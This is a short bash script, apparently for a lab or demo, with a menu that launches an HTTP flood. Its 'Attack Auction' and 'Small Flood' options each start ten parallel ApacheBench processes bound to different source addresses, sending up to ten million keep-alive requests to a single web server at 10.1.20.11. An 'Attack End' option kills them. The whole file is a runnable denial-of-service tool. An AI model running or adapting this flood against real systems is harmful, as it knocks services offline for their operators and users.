#!/bin/bash

PS5='Please enter your choice: '
options=("Attack Auction" "Small Flood" "Attack End" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Attack Auction")
            echo "Start attack"
            ab -B 10.1.17.221 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.222 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.223 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.224 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.225 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.226 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.227 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.228 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.229 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.220 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ;;
        "Attack End")
            echo "Terminate attack"

        killall ab
            ;;
        "Small Flood")
            echo "Start attack"
            ab -B 10.1.17.221 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.222 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.223 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.224 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.225 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.226 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.227 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.228 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.229 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ab -B 10.1.17.220 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
            ;;

        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done